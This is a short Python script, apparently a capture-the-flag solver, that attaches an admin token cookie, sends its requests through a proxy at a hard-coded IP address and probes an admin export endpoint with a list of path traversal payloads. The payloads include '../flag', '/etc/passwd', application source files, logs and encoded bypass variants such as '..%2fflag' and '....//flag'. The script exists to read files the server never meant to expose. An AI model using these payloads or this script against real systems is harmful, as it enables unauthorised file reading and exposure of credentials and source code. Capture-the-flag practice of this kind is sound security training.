import sys, os, json, urllib.parse
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px

BASE = "http://103.163.47.230:34414"
tok = json.load(open("admin_token.json"))["token"]
OP = px.opener("http://143.246.138.227:80")
OP.addheaders = [("User-Agent", "Mozilla/5.0"), ("Cookie", "htu_token=" + tok)]

cands = [
    "../flag", "../../flag", "../../../flag", "/flag", "/flag.txt", "../flag.txt",
    "../app.py", "../server.py", "../main.py", "/app/app.py", "../logs/audit.log",
    "../audit.log", "../access.log", "../data/audit.log", "../reports/monthly.csv",
    "/etc/passwd", "....//flag", "..%2fflag", "%2e%2e/flag",
]
for f in cands:
    s, h, b = px.get(BASE + "/api/admin/export?file=" + urllib.parse.quote(f, safe=""), OP)
    flag = "HTUCTF{" in b or "htuctf{" in b
    print("%-24s %s %5d %s %s" % (f, s, len(b), "FLAG!" if flag else "", b[:120].replace("\n", " | ")))
